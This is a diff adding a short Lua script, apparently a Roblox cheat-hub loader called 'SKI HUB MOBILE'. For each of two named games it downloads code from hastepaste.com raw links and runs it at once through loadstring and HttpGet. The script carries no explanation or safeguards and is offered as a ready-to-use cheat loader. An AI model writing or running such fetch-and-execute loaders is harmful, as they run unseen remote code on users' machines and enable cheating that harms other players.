@@ -1,0 +1,7 @@
+--(SKI HUB MOBILE V1.1)--
+if game.PlaceId == 5985232436 then
+loadstring(game:HttpGet(("https://hastepaste.com/raw/2b1qMHVU"), true))() -- Infectious smile on this line
+end
+if game.PlaceId == 292439477 then
+loadstring(game:HttpGet(("https://hastepaste.com/raw/PbtL"), true))() -- Phantom forces on this line
+end
